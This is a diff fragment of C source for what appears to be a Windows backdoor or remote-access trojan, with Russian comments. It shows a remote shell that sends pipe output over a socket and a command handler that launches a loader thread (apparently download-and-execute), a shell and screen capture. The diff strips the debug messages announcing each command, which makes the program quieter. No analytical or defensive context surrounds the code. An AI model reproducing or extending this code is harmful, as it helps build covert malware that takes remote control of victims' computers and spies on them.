@@ -270,7 +270,6 @@ DWORD WINAPI RUNSHELL(LPVOID port)
 					{
 						send(shellsock, szBuffer, lpNumberOfBytesRead, 0);
 					}
-						
 					PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
 				}
 				
@@ -316,25 +315,18 @@ DWORD WINAPI RecvThread(LPVOID param)
 			{
 				case CMD_LOADER://если indata.cmd == CMD_LOADER
 				{
-					printf("\nsignal cmd_loader\n");
-					//DLE dle; //инициализируем структуру DLE
-					//memset(&dle, 0, sizeof(DLE)); //очищаем ее
-					//memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
-					//CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
 					CreateThread(NULL, 0, DLEFUNC, NULL, 0, 0);
 					break;
 				}
 
 				case CMD_SHELL:
 				{
-					printf("\nsignal cmd_shell\n");
 					CreateThread(NULL, 0, RUNSHELL, NULL, 0, 0);
 					break;
 				}
 
 				case CMD_SCREEN:
 				{
-					printf("\nsignal cmd_screen\n");
 					CreateThread(NULL, 0, GETSCREEN, NULL, 0, 0);
 					break;
 				}
@@ -361,6 +353,9 @@ int WINAPI WinMain(
 	int       nShowCmd
 )
 {
+	//hIn = GetStdHandle(STD_INPUT_HANDLE);
+	//hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+
 	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
 	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
 	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
